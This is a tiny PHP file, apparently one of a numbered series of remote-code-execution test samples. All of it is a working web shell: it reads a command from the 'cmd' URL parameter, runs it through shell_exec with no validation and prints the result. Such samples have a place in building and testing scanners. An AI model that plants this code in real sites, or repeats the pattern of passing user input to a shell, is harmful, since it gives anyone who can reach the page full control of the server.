<?php
// RCE test variation #543
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>